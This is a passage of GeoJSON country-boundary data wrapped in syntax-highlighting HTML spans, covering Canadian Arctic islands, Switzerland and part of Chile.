class="hljs-selector-attr">[-107.68599,72.06548]</span>,<span class="hljs-selector-attr">[-108.39639,73.08953]</span>,<span class="hljs-selector-attr">[-107.51645,73.23598]</span>,<span class="hljs-selector-attr">[-106.52259,73.07601]</span>,<span class="hljs-selector-attr">[-105.40246,72.67259]</span>,<span class="hljs-selector-attr">[-104.77484,71.6984]</span>,<span class="hljs-selector-attr">[-104.46476,70.99297]</span>,<span class="hljs-selector-attr">[-102.78537,70.49776]</span>,<span class="hljs-selector-attr">[-100.98078,70.02432]</span>,<span class="hljs-selector-attr">[-101.08929,69.58447]</span>,<span class="hljs-selector-attr">[-102.73116,69.50402]</span>,<span class="hljs-selector-attr">[-102.09329,69.11962]</span>,<span class="hljs-selector-attr">[-102.43024,68.75282]</span>,<span class="hljs-selector-attr">[-104.24,68.91]</span>,<span class="hljs-selector-attr">[-105.96,69.18]</span>,<span class="hljs-selector-attr">[-107.12254,69.11922]</span>,<span class="hljs-selector-attr">[-109,68.78]</span>,<span class="hljs-selector-attr">[-111.534149,68.630059]</span>,<span class="hljs-selector-attr">[-113.3132,68.53554]</span>,<span class="hljs-selector-attr">[-113.85496,69.00744]</span>,<span class="hljs-selector-attr">[-115.22,69.28]</span>,<span class="hljs-selector-attr">[-116.10794,69.16821]</span>,<span class="hljs-selector-attr">[-117.34,69.96]</span>,<span class="hljs-selector-attr">[-116.67473,70.06655]</span>,<span class="hljs-selector-attr">[-115.13112,70.2373]</span>,<span class="hljs-selector-attr">[-113.72141,70.19237]</span>,<span class="hljs-selector-attr">[-112.4161,70.36638]</span>,<span class="hljs-selector-attr">[-114.35,70.6]</span>,<span class="hljs-selector-attr">[-116.48684,70.52045]</span>,<span class="hljs-selector-attr">[-117.9048,70.54056]</span>,<span class="hljs-selector-attr">[-118.43238,70.9092]</span>,<span class="hljs-selector-attr">[-116.11311,71.30918]</span>,<span class="hljs-selector-attr">[-117.65568,71.2952]</span>,<span class="hljs-selector-attr">[-119.40199,71.55859]</span>,<span class="hljs-selector-attr">[-118.56267,72.30785]</span>,<span class="hljs-selector-attr">[-117.86642,72.70594]</span>,<span class="hljs-selector-attr">[-115.18909,73.31459]</span>,<span class="hljs-selector-attr">[-114.16717,73.12145]</span>]],<span class="hljs-selector-attr">[[[-104.5,73.42]</span>,<span class="hljs-selector-attr">[-105.38,72.76]</span>,<span class="hljs-selector-attr">[-106.94,73.46]</span>,<span class="hljs-selector-attr">[-106.6,73.6]</span>,<span class="hljs-selector-attr">[-105.26,73.64]</span>,<span class="hljs-selector-attr">[-104.5,73.42]</span>]],<span class="hljs-selector-attr">[[[-76.34,73.102685]</span>,<span class="hljs-selector-attr">[-76.251404,72.826385]</span>,<span class="hljs-selector-attr">[-77.314438,72.855545]</span>,<span class="hljs-selector-attr">[-78.39167,72.876656]</span>,<span class="hljs-selector-attr">[-79.486252,72.742203]</span>,<span class="hljs-selector-attr">[-79.775833,72.802902]</span>,<span class="hljs-selector-attr">[-80.876099,73.333183]</span>,<span class="hljs-selector-attr">[-80.833885,73.693184]</span>,<span class="hljs-selector-attr">[-80.353058,73.75972]</span>,<span class="hljs-selector-attr">[-78.064438,73.651932]</span>,<span class="hljs-selector-attr">[-76.34,73.102685]</span>]],<span class="hljs-selector-attr">[[[-86.562179,73.157447]</span>,<span class="hljs-selector-attr">[-85.774371,72.534126]</span>,<span class="hljs-selector-attr">[-84.850112,73.340278]</span>,<span class="hljs-selector-attr">[-82.31559,73.750951]</span>,<span class="hljs-selector-attr">[-80.600088,72.716544]</span>,<span class="hljs-selector-attr">[-80.748942,72.061907]</span>,<span class="hljs-selector-attr">[-78.770639,72.352173]</span>,<span class="hljs-selector-attr">[-77.824624,72.749617]</span>,<span class="hljs-selector-attr">[-75.605845,72.243678]</span>,<span class="hljs-selector-attr">[-74.228616,71.767144]</span>,<span class="hljs-selector-attr">[-74.099141,71.33084]</span>,<span class="hljs-selector-attr">[-72.242226,71.556925]</span>,<span class="hljs-selector-attr">[-71.200015,70.920013]</span>,<span class="hljs-selector-attr">[-68.786054,70.525024]</span>,<span class="hljs-selector-attr">[-67.91497,70.121948]</span>,<span class="hljs-selector-attr">[-66.969033,69.186087]</span>,<span class="hljs-selector-attr">[-68.805123,68.720198]</span>,<span class="hljs-selector-attr">[-66.449866,68.067163]</span>,<span class="hljs-selector-attr">[-64.862314,67.847539]</span>,<span class="hljs-selector-attr">[-63.424934,66.928473]</span>,<span class="hljs-selector-attr">[-61.851981,66.862121]</span>,<span class="hljs-selector-attr">[-62.163177,66.160251]</span>,<span class="hljs-selector-attr">[-63.918444,64.998669]</span>,<span class="hljs-selector-attr">[-65.14886,65.426033]</span>,<span class="hljs-selector-attr">[-66.721219,66.388041]</span>,<span class="hljs-selector-attr">[-68.015016,66.262726]</span>,<span class="hljs-selector-attr">[-68.141287,65.689789]</span>,<span class="hljs-selector-attr">[-67.089646,65.108455]</span>,<span class="hljs-selector-attr">[-65.73208,64.648406]</span>,<span class="hljs-selector-attr">[-65.320168,64.382737]</span>,<span class="hljs-selector-attr">[-64.669406,63.392927]</span>,<span class="hljs-selector-attr">[-65.013804,62.674185]</span>,<span class="hljs-selector-attr">[-66.275045,62.945099]</span>,<span class="hljs-selector-attr">[-68.783186,63.74567]</span>,<span class="hljs-selector-attr">[-67.369681,62.883966]</span>,<span class="hljs-selector-attr">[-66.328297,62.280075]</span>,<span class="hljs-selector-attr">[-66.165568,61.930897]</span>,<span class="hljs-selector-attr">[-68.877367,62.330149]</span>,<span class="hljs-selector-attr">[-71.023437,62.910708]</span>,<span class="hljs-selector-attr">[-72.235379,63.397836]</span>,<span class="hljs-selector-attr">[-71.886278,63.679989]</span>,<span class="hljs-selector-attr">[-73.378306,64.193963]</span>,<span class="hljs-selector-attr">[-74.834419,64.679076]</span>,<span class="hljs-selector-attr">[-74.818503,64.389093]</span>,<span class="hljs-selector-attr">[-77.70998,64.229542]</span>,<span class="hljs-selector-attr">[-78.555949,64.572906]</span>,<span class="hljs-selector-attr">[-77.897281,65.309192]</span>,<span class="hljs-selector-attr">[-76.018274,65.326969]</span>,<span class="hljs-selector-attr">[-73.959795,65.454765]</span>,<span class="hljs-selector-attr">[-74.293883,65.811771]</span>,<span class="hljs-selector-attr">[-73.944912,66.310578]</span>,<span class="hljs-selector-attr">[-72.651167,67.284576]</span>,<span class="hljs-selector-attr">[-72.92606,67.726926]</span>,<span class="hljs-selector-attr">[-73.311618,68.069437]</span>,<span class="hljs-selector-attr">[-74.843307,68.554627]</span>,<span class="hljs-selector-attr">[-76.869101,68.894736]</span>,<span class="hljs-selector-attr">[-76.228649,69.147769]</span>,<span class="hljs-selector-attr">[-77.28737,69.76954]</span>,<span class="hljs-selector-attr">[-78.168634,69.826488]</span>,<span class="hljs-selector-attr">[-78.957242,70.16688]</span>,<span class="hljs-selector-attr">[-79.492455,69.871808]</span>,<span class="hljs-selector-attr">[-81.305471,69.743185]</span>,<span class="hljs-selector-attr">[-84.944706,69.966634]</span>,<span class="hljs-selector-attr">[-87.060003,70.260001]</span>,<span class="hljs-selector-attr">[-88.681713,70.410741]</span>,<span class="hljs-selector-attr">[-89.51342,70.762038]</span>,<span class="hljs-selector-attr">[-88.467721,71.218186]</span>,<span class="hljs-selector-attr">[-89.888151,71.222552]</span>,<span class="hljs-selector-attr">[-90.20516,72.235074]</span>,<span class="hljs-selector-attr">[-89.436577,73.129464]</span>,<span class="hljs-selector-attr">[-88.408242,73.537889]</span>,<span class="hljs-selector-attr">[-85.826151,73.803816]</span>,<span class="hljs-selector-attr">[-86.562179,73.157447]</span>]],<span class="hljs-selector-attr">[[[-100.35642,73.84389]</span>,<span class="hljs-selector-attr">[-99.16387,73.63339]</span>,<span class="hljs-selector-attr">[-97.38,73.76]</span>,<span class="hljs-selector-attr">[-97.12,73.47]</span>,<span class="hljs-selector-attr">[-98.05359,72.99052]</span>,<span class="hljs-selector-attr">[-96.54,72.56]</span>,<span class="hljs-selector-attr">[-96.72,71.66]</span>,<span class="hljs-selector-attr">[-98.35966,71.27285]</span>,<span class="hljs-selector-attr">[-99.32286,71.35639]</span>,<span class="hljs-selector-attr">[-100.01482,71.73827]</span>,<span class="hljs-selector-attr">[-102.5,72.51]</span>,<span class="hljs-selector-attr">[-102.48,72.83]</span>,<span class="hljs-selector-attr">[-100.43836,72.70588]</span>,<span class="hljs-selector-attr">[-101.54,73.36]</span>,<span class="hljs-selector-attr">[-100.35642,73.84389]</span>]],<span class="hljs-selector-attr">[[[-93.196296,72.771992]</span>,<span class="hljs-selector-attr">[-94.269047,72.024596]</span>,<span class="hljs-selector-attr">[-95.409856,72.061881]</span>,<span class="hljs-selector-attr">[-96.033745,72.940277]</span>,<span class="hljs-selector-attr">[-96.018268,73.43743]</span>,<span class="hljs-selector-attr">[-95.495793,73.862417]</span>,<span class="hljs-selector-attr">[-94.503658,74.134907]</span>,<span class="hljs-selector-attr">[-92.420012,74.100025]</span>,<span class="hljs-selector-attr">[-90.509793,73.856732]</span>,<span class="hljs-selector-attr">[-92.003965,72.966244]</span>,<span class="hljs-selector-attr">[-93.196296,72.771992]</span>]],<span class="hljs-selector-attr">[[[-120.46,71.383602]</span>,<span class="hljs-selector-attr">[-123.09219,70.90164]</span>,<span class="hljs-selector-attr">[-123.62,71.34]</span>,<span class="hljs-selector-attr">[-125.928949,71.868688]</span>,<span class="hljs-selector-attr">[-125.5,72.292261]</span>,<span class="hljs-selector-attr">[-124.80729,73.02256]</span>,<span class="hljs-selector-attr">[-123.94,73.68]</span>,<span class="hljs-selector-attr">[-124.91775,74.29275]</span>,<span class="hljs-selector-attr">[-121.53788,74.44893]</span>,<span class="hljs-selector-attr">[-120.10978,74.24135]</span>,<span class="hljs-selector-attr">[-117.55564,74.18577]</span>,<span class="hljs-selector-attr">[-116.58442,73.89607]</span>,<span class="hljs-selector-attr">[-115.51081,73.47519]</span>,<span class="hljs-selector-attr">[-116.76794,73.22292]</span>,<span class="hljs-selector-attr">[-119.22,72.52]</span>,<span class="hljs-selector-attr">[-120.46,71.82]</span>,<span class="hljs-selector-attr">[-120.46,71.383602]</span>]],<span class="hljs-selector-attr">[[[-93.612756,74.979997]</span>,<span class="hljs-selector-attr">[-94.156909,74.592347]</span>,<span class="hljs-selector-attr">[-95.608681,74.666864]</span>,<span class="hljs-selector-attr">[-96.820932,74.927623]</span>,<span class="hljs-selector-attr">[-96.288587,75.377828]</span>,<span class="hljs-selector-attr">[-94.85082,75.647218]</span>,<span class="hljs-selector-attr">[-93.977747,75.29649]</span>,<span class="hljs-selector-attr">[-93.612756,74.979997]</span>]],<span class="hljs-selector-attr">[[[-98.5,76.72]</span>,<span class="hljs-selector-attr">[-97.735585,76.25656]</span>,<span class="hljs-selector-attr">[-97.704415,75.74344]</span>,<span class="hljs-selector-attr">[-98.16,75]</span>,<span class="hljs-selector-attr">[-99.80874,74.89744]</span>,<span class="hljs-selector-attr">[-100.88366,75.05736]</span>,<span class="hljs-selector-attr">[-100.86292,75.64075]</span>,<span class="hljs-selector-attr">[-102.50209,75.5638]</span>,<span class="hljs-selector-attr">[-102.56552,76.3366]</span>,<span class="hljs-selector-attr">[-101.48973,76.30537]</span>,<span class="hljs-selector-attr">[-99.98349,76.64634]</span>,<span class="hljs-selector-attr">[-98.57699,76.58859]</span>,<span class="hljs-selector-attr">[-98.5,76.72]</span>]],<span class="hljs-selector-attr">[[[-108.21141,76.20168]</span>,<span class="hljs-selector-attr">[-107.81943,75.84552]</span>,<span class="hljs-selector-attr">[-106.92893,76.01282]</span>,<span class="hljs-selector-attr">[-105.881,75.9694]</span>,<span class="hljs-selector-attr">[-105.70498,75.47951]</span>,<span class="hljs-selector-attr">[-106.31347,75.00527]</span>,<span class="hljs-selector-attr">[-109.7,74.85]</span>,<span class="hljs-selector-attr">[-112.22307,74.41696]</span>,<span class="hljs-selector-attr">[-113.74381,74.39427]</span>,<span class="hljs-selector-attr">[-113.87135,74.72029]</span>,<span class="hljs-selector-attr">[-111.79421,75.1625]</span>,<span class="hljs-selector-attr">[-116.31221,75.04343]</span>,<span class="hljs-selector-attr">[-117.7104,75.2222]</span>,<span class="hljs-selector-attr">[-116.34602,76.19903]</span>,<span class="hljs-selector-attr">[-115.40487,76.47887]</span>,<span class="hljs-selector-attr">[-112.59056,76.14134]</span>,<span class="hljs-selector-attr">[-110.81422,75.54919]</span>,<span class="hljs-selector-attr">[-109.0671,75.47321]</span>,<span class="hljs-selector-attr">[-110.49726,76.42982]</span>,<span class="hljs-selector-attr">[-109.5811,76.79417]</span>,<span class="hljs-selector-attr">[-108.54859,76.67832]</span>,<span class="hljs-selector-attr">[-108.21141,76.20168]</span>]],<span class="hljs-selector-attr">[[[-94.684086,77.097878]</span>,<span class="hljs-selector-attr">[-93.573921,76.776296]</span>,<span class="hljs-selector-attr">[-91.605023,76.778518]</span>,<span class="hljs-selector-attr">[-90.741846,76.449597]</span>,<span class="hljs-selector-attr">[-90.969661,76.074013]</span>,<span class="hljs-selector-attr">[-89.822238,75.847774]</span>,<span class="hljs-selector-attr">[-89.187083,75.610166]</span>,<span class="hljs-selector-attr">[-87.838276,75.566189]</span>,<span class="hljs-selector-attr">[-86.379192,75.482421]</span>,<span class="hljs-selector-attr">[-84.789625,75.699204]</span>,<span class="hljs-selector-attr">[-82.753445,75.784315]</span>,<span class="hljs-selector-attr">[-81.128531,75.713983]</span>,<span class="hljs-selector-attr">[-80.057511,75.336849]</span>,<span class="hljs-selector-attr">[-79.833933,74.923127]</span>,<span class="hljs-selector-attr">[-80.457771,74.657304]</span>,<span class="hljs-selector-attr">[-81.948843,74.442459]</span>,<span class="hljs-selector-attr">[-83.228894,74.564028]</span>,<span class="hljs-selector-attr">[-86.097452,74.410032]</span>,<span class="hljs-selector-attr">[-88.15035,74.392307]</span>,<span class="hljs-selector-attr">[-89.764722,74.515555]</span>,<span class="hljs-selector-attr">[-92.422441,74.837758]</span>,<span class="hljs-selector-attr">[-92.768285,75.38682]</span>,<span class="hljs-selector-attr">[-92.889906,75.882655]</span>,<span class="hljs-selector-attr">[-93.893824,76.319244]</span>,<span class="hljs-selector-attr">[-95.962457,76.441381]</span>,<span class="hljs-selector-attr">[-97.121379,76.751078]</span>,<span class="hljs-selector-attr">[-96.745123,77.161389]</span>,<span class="hljs-selector-attr">[-94.684086,77.097878]</span>]],<span class="hljs-selector-attr">[[[-116.198587,77.645287]</span>,<span class="hljs-selector-attr">[-116.335813,76.876962]</span>,<span class="hljs-selector-attr">[-117.106051,76.530032]</span>,<span class="hljs-selector-attr">[-118.040412,76.481172]</span>,<span class="hljs-selector-attr">[-119.899318,76.053213]</span>,<span class="hljs-selector-attr">[-121.499995,75.900019]</span>,<span class="hljs-selector-attr">[-122.854924,76.116543]</span>,<span class="hljs-selector-attr">[-122.854925,76.116543]</span>,<span class="hljs-selector-attr">[-121.157535,76.864508]</span>,<span class="hljs-selector-attr">[-119.103939,77.51222]</span>,<span class="hljs-selector-attr">[-117.570131,77.498319]</span>,<span class="hljs-selector-attr">[-116.198587,77.645287]</span>]],<span class="hljs-selector-attr">[[[-93.840003,77.519997]</span>,<span class="hljs-selector-attr">[-94.295608,77.491343]</span>,<span class="hljs-selector-attr">[-96.169654,77.555111]</span>,<span class="hljs-selector-attr">[-96.436304,77.834629]</span>,<span class="hljs-selector-attr">[-94.422577,77.820005]</span>,<span class="hljs-selector-attr">[-93.720656,77.634331]</span>,<span class="hljs-selector-attr">[-93.840003,77.519997]</span>]],<span class="hljs-selector-attr">[[[-110.186938,77.697015]</span>,<span class="hljs-selector-attr">[-112.051191,77.409229]</span>,<span class="hljs-selector-attr">[-113.534279,77.732207]</span>,<span class="hljs-selector-attr">[-112.724587,78.05105]</span>,<span class="hljs-selector-attr">[-111.264443,78.152956]</span>,<span class="hljs-selector-attr">[-109.854452,77.996325]</span>,<span class="hljs-selector-attr">[-110.186938,77.697015]</span>]],<span class="hljs-selector-attr">[[[-109.663146,78.601973]</span>,<span class="hljs-selector-attr">[-110.881314,78.40692]</span>,<span class="hljs-selector-attr">[-112.542091,78.407902]</span>,<span class="hljs-selector-attr">[-112.525891,78.550555]</span>,<span class="hljs-selector-attr">[-111.50001,78.849994]</span>,<span class="hljs-selector-attr">[-110.963661,78.804441]</span>,<span class="hljs-selector-attr">[-109.663146,78.601973]</span>]],<span class="hljs-selector-attr">[[[-95.830295,78.056941]</span>,<span class="hljs-selector-attr">[-97.309843,77.850597]</span>,<span class="hljs-selector-attr">[-98.124289,78.082857]</span>,<span class="hljs-selector-attr">[-98.552868,78.458105]</span>,<span class="hljs-selector-attr">[-98.631984,78.87193]</span>,<span class="hljs-selector-attr">[-97.337231,78.831984]</span>,<span class="hljs-selector-attr">[-96.754399,78.765813]</span>,<span class="hljs-selector-attr">[-95.559278,78.418315]</span>,<span class="hljs-selector-attr">[-95.830295,78.056941]</span>]],<span class="hljs-selector-attr">[[[-100.060192,78.324754]</span>,<span class="hljs-selector-attr">[-99.670939,77.907545]</span>,<span class="hljs-selector-attr">[-101.30394,78.018985]</span>,<span class="hljs-selector-attr">[-102.949809,78.343229]</span>,<span class="hljs-selector-attr">[-105.176133,78.380332]</span>,<span class="hljs-selector-attr">[-104.210429,78.67742]</span>,<span class="hljs-selector-attr">[-105.41958,78.918336]</span>,<span class="hljs-selector-attr">[-105.492289,79.301594]</span>,<span class="hljs-selector-attr">[-103.529282,79.165349]</span>,<span class="hljs-selector-attr">[-100.825158,78.800462]</span>,<span class="hljs-selector-attr">[-100.060192,78.324754]</span>]],<span class="hljs-selector-attr">[[[-87.02,79.66]</span>,<span class="hljs-selector-attr">[-85.81435,79.3369]</span>,<span class="hljs-selector-attr">[-87.18756,79.0393]</span>,<span class="hljs-selector-attr">[-89.03535,78.28723]</span>,<span class="hljs-selector-attr">[-90.80436,78.21533]</span>,<span class="hljs-selector-attr">[-92.87669,78.34333]</span>,<span class="hljs-selector-attr">[-93.95116,78.75099]</span>,<span class="hljs-selector-attr">[-93.93574,79.11373]</span>,<span class="hljs-selector-attr">[-93.14524,79.3801]</span>,<span class="hljs-selector-attr">[-94.974,79.37248]</span>,<span class="hljs-selector-attr">[-96.07614,79.70502]</span>,<span class="hljs-selector-attr">[-96.70972,80.15777]</span>,<span class="hljs-selector-attr">[-96.01644,80.60233]</span>,<span class="hljs-selector-attr">[-95.32345,80.90729]</span>,<span class="hljs-selector-attr">[-94.29843,80.97727]</span>,<span class="hljs-selector-attr">[-94.73542,81.20646]</span>,<span class="hljs-selector-attr">[-92.40984,81.25739]</span>,<span class="hljs-selector-attr">[-91.13289,80.72345]</span>,<span class="hljs-selector-attr">[-89.45,80.509322]</span>,<span class="hljs-selector-attr">[-87.81,80.32]</span>,<span class="hljs-selector-attr">[-87.02,79.66]</span>]],<span class="hljs-selector-attr">[[[-68.5,83.106322]</span>,<span class="hljs-selector-attr">[-65.82735,83.02801]</span>,<span class="hljs-selector-attr">[-63.68,82.9]</span>,<span class="hljs-selector-attr">[-61.85,82.6286]</span>,<span class="hljs-selector-attr">[-61.89388,82.36165]</span>,<span class="hljs-selector-attr">[-64.334,81.92775]</span>,<span class="hljs-selector-attr">[-66.75342,81.72527]</span>,<span class="hljs-selector-attr">[-67.65755,81.50141]</span>,<span class="hljs-selector-attr">[-65.48031,81.50657]</span>,<span class="hljs-selector-attr">[-67.84,80.9]</span>,<span class="hljs-selector-attr">[-69.4697,80.61683]</span>,<span class="hljs-selector-attr">[-71.18,79.8]</span>,<span class="hljs-selector-attr">[-73.2428,79.63415]</span>,<span class="hljs-selector-attr">[-73.88,79.430162]</span>,<span class="hljs-selector-attr">[-76.90773,79.32309]</span>,<span class="hljs-selector-attr">[-75.52924,79.19766]</span>,<span class="hljs-selector-attr">[-76.22046,79.01907]</span>,<span class="hljs-selector-attr">[-75.39345,78.52581]</span>,<span class="hljs-selector-attr">[-76.34354,78.18296]</span>,<span class="hljs-selector-attr">[-77.88851,77.89991]</span>,<span class="hljs-selector-attr">[-78.36269,77.50859]</span>,<span class="hljs-selector-attr">[-79.75951,77.20968]</span>,<span class="hljs-selector-attr">[-79.61965,76.98336]</span>,<span class="hljs-selector-attr">[-77.91089,77.022045]</span>,<span class="hljs-selector-attr">[-77.88911,76.777955]</span>,<span class="hljs-selector-attr">[-80.56125,76.17812]</span>,<span class="hljs-selector-attr">[-83.17439,76.45403]</span>,<span class="hljs-selector-attr">[-86.11184,76.29901]</span>,<span class="hljs-selector-attr">[-87.6,76.42]</span>,<span class="hljs-selector-attr">[-89.49068,76.47239]</span>,<span class="hljs-selector-attr">[-89.6161,76.95213]</span>,<span class="hljs-selector-attr">[-87.76739,77.17833]</span>,<span class="hljs-selector-attr">[-88.26,77.9]</span>,<span class="hljs-selector-attr">[-87.65,77.970222]</span>,<span class="hljs-selector-attr">[-84.97634,77.53873]</span>,<span class="hljs-selector-attr">[-86.34,78.18]</span>,<span class="hljs-selector-attr">[-87.96192,78.37181]</span>,<span class="hljs-selector-attr">[-87.15198,78.75867]</span>,<span class="hljs-selector-attr">[-85.37868,78.9969]</span>,<span class="hljs-selector-attr">[-85.09495,79.34543]</span>,<span class="hljs-selector-attr">[-86.50734,79.73624]</span>,<span class="hljs-selector-attr">[-86.93179,80.25145]</span>,<span class="hljs-selector-attr">[-84.19844,80.20836]</span>,<span class="hljs-selector-attr">[-83.408696,80.1]</span>,<span class="hljs-selector-attr">[-81.84823,80.46442]</span>,<span class="hljs-selector-attr">[-84.1,80.58]</span>,<span class="hljs-selector-attr">[-87.59895,80.51627]</span>,<span class="hljs-selector-attr">[-89.36663,80.85569]</span>,<span class="hljs-selector-attr">[-90.2,81.26]</span>,<span class="hljs-selector-attr">[-91.36786,81.5531]</span>,<span class="hljs-selector-attr">[-91.58702,81.89429]</span>,<span class="hljs-selector-attr">[-90.1,82.085]</span>,<span class="hljs-selector-attr">[-88.93227,82.11751]</span>,<span class="hljs-selector-attr">[-86.97024,82.27961]</span>,<span class="hljs-selector-attr">[-85.5,82.652273]</span>,<span class="hljs-selector-attr">[-84.260005,82.6]</span>,<span class="hljs-selector-attr">[-83.18,82.32]</span>,<span class="hljs-selector-attr">[-82.42,82.86]</span>,<span class="hljs-selector-attr">[-81.1,83.02]</span>,<span class="hljs-selector-attr">[-79.30664,83.13056]</span>,<span class="hljs-selector-attr">[-76.25,83.172059]</span>,<span class="hljs-selector-attr">[-75.71878,83.06404]</span>,<span class="hljs-selector-attr">[-72.83153,83.23324]</span>,<span class="hljs-selector-attr">[-70.665765,83.169781]</span>,<span class="hljs-selector-attr">[-68.5,83.106322]</span>]]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">CHE</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Switzerland</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[9.594226,47.525058]</span>,<span class="hljs-selector-attr">[9.632932,47.347601]</span>,<span class="hljs-selector-attr">[9.47997,47.10281]</span>,<span class="hljs-selector-attr">[9.932448,46.920728]</span>,<span class="hljs-selector-attr">[10.442701,46.893546]</span>,<span class="hljs-selector-attr">[10.363378,46.483571]</span>,<span class="hljs-selector-attr">[9.922837,46.314899]</span>,<span class="hljs-selector-attr">[9.182882,46.440215]</span>,<span class="hljs-selector-attr">[8.966306,46.036932]</span>,<span class="hljs-selector-attr">[8.489952,46.005151]</span>,<span class="hljs-selector-attr">[8.31663,46.163642]</span>,<span class="hljs-selector-attr">[7.755992,45.82449]</span>,<span class="hljs-selector-attr">[7.273851,45.776948]</span>,<span class="hljs-selector-attr">[6.843593,45.991147]</span>,<span class="hljs-selector-attr">[6.5001,46.429673]</span>,<span class="hljs-selector-attr">[6.022609,46.27299]</span>,<span class="hljs-selector-attr">[6.037389,46.725779]</span>,<span class="hljs-selector-attr">[6.768714,47.287708]</span>,<span class="hljs-selector-attr">[6.736571,47.541801]</span>,<span class="hljs-selector-attr">[7.192202,47.449766]</span>,<span class="hljs-selector-attr">[7.466759,47.620582]</span>,<span class="hljs-selector-attr">[8.317301,47.61358]</span>,<span class="hljs-selector-attr">[8.522612,47.830828]</span>,<span class="hljs-selector-attr">[9.594226,47.525058]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">CHL</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Chile</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[-68.63401,-52.63637]</span>,<span class="hljs-selector-attr">[-68.63335,-54.8695]</span>,<span class="hljs-selector-attr">[-67.56244,-54.87001]</span>,<span class="hljs-selector-attr">[-66.95992,-54.89681]</span>,<span class="hljs-selector-attr">[-67.29103,-55.30124]</span>,<span class="hljs-selector-attr">[-68.14863,-55.61183]</span>,<span class="hljs-selector-attr">[-68.639991,-55.580018]</span>,<span class="hljs-selector-attr">[-69.2321,-55.49906]</span>,<span class="hljs-selector-attr">[-69.95809,-55.19843]</span>,<span class="hljs-selector-attr">[-71.00568,-55.05383]</span>,<span class="hljs-selector-attr">[-72.2639,-54.49514]</span>,<span class="hljs-selector-attr">[-73.2852,-53.95752]</span>,<span class="hljs-selector-attr">[-74.66253,-52.83749]</span>,<span class="hljs-selector-attr">[-73.8381,-53.04743]</span>,<span class="hljs-selector-attr">[-72.43418,-53.7154]</span>,<span class="hljs-selector-attr">[-71.10773,-54.07433]</span>,<span class="hljs-selector-attr">[-70.59178,-53.61583]</span>,<span class="hljs-selector-attr">[-70.26748,-52.93123]</span>,<span class="hljs-selector-attr">[-69.34565,-52.5183]</span>,<span class="hljs-selector-attr">[-68.63401,-52.63637]</span>]],<span class="hljs-selector-attr">[[[-68.219913,-21.494347]</span>,<span class="hljs-selector-attr">[-67.82818,-22.872919]</span>,<span class="hljs-selector-attr">[-67.106674,-22.735925]</span>,<span class="hljs-selector-attr">[-66.985234,-22.986349]</span>,<span class="hljs-selector-attr">[-67.328443,-24.025303]</span>,<span class="hljs-selector-attr">[-68.417653,-24.518555]</span>,<span class="hljs-selector-attr">[-68.386001,-26.185016]</span>,<span class="hljs-selector-attr">[-68.5948,-26.506909]</span>,<span class="hljs-selector-attr">[-68.295542,-26.89934]</span>,<span class="hljs-selector-attr">[-69.001235,-27.521214]</span>,<span class="hljs-selector-attr">[-69.65613,-28.459141]</span>,<span class="hljs-selector-attr">[-70.01355,-29.367923]</span>,<span class="hljs-selector-attr">[-69.919008,-30.336339]</span>,<span class="hljs-selector-attr">[-70.535069,-31.36501]</span>,<span class="hljs-selector-attr">[-70.074399,-33.09121]</span>,<span class="hljs-selector-attr">[-69.814777,-33.273886]</span>,<span class="hljs-selector-attr">[-69.817309,-34.193571]</span>,<span class="hljs-selector-attr">[-70.388049,-35.169688]</span>,<span class="hljs-selector-attr">[-70.364769,-36.005089]</span>,<span class="hljs-selector-attr">[-71.121881,-36.658124]</span>,<span class="hljs-selector-attr">[-71.118625,-37.576827]</span>,<span class="hljs-selector-attr">[-70.814664,-38.552995]</span>,<span class="hljs-selector-attr">[-71.413517,-38.916022]</span>,<span class="hljs-selector-attr">[-71.680761,-39.808164]</span>,<span class="hljs-selector-attr">[-71.915734,-40.832339]</span>,<span class="hljs-selector-attr">[-71.746804,-42.051386]</span>,<span class="hljs-selector-attr">[-72.148898,-42.254888]</span>,<span class="hljs-selector-attr">[-71.915424,-43.408565]</span>,<span class="hljs-selector-attr">[-71.464056,-43.787611]</span>,<span class="hljs-selector-attr">[-71.793623,-44.207172]</span>,<span class="hljs-selector-attr">[-71.329801,-44.407522]</span>,<span class="hljs-selector-attr">[-71.222779,-44.784243]</span>,<span class="hljs-selector-attr">[-71.659316,-44.973689]</span>,<span class="hljs-selector-attr">[-71.552009,-45.560733]</span>,<span class="hljs-selector-attr">[-71.917258,-46.884838]</span>,<span class="hljs-selector-attr">[-72.447355,-47.738533]</span>,<span class="hljs-selector-attr">[-72.331161,-48.244238]</span>,<span class="hljs-selector-attr">[-72.648247,-48.878618]</span>,<span class="hljs-selector-attr">[-73.415436,-49.318436]</span>,<span class="hljs-selector-attr">[-73.328051,-50.378785]</span>,<span class="hljs-selector-attr">[-72.975747,-50.74145]</span>,<span class="hljs-selector-attr">[-72.309974,-50.67701]</span>,<span class="hljs-selector-attr">[-72.329404,-51.425956]</span>,<span class="hljs-selector-attr">[-71.914804,-52.009022]</span>,<span class="hljs-selector-attr">[-69.498362,-52.142761]</span>,<span class="hljs-selector-attr">[-68.571545,-52.299444]</span>,<span class="hljs-selector-attr">[-69.461284,-52.291951]</span>,<span class="hljs-selector-attr">[-69.94278,-52.537931]</span>,<span class="hljs-selector-attr">[-70.845102,-52.899201]</span>,<span class="hljs-selector-attr">[-71.006332,-53.833252]</span>,<span class="hljs-selector-attr">[-71.429795,-53.856455]</span>,<span class="hljs-selector-attr">[-72.557943,-53.53141]</span>,<span class="hljs-selector-attr">[-73.702757,-52.835069]</span>,<span class="hljs-selector-attr">[-73.702757,-52.83507]</span>,<span class="hljs-selector-attr">[-74.946763,-52.262754]</span>,<span class="hljs-selector-attr">[-75.260026,-51.629355]</span>,<span class="hljs-selector-attr">[-74.976632,-51.043396]</span>,<span class="hljs-selector-attr">[-75.479754,-50.378372]</span>,<span 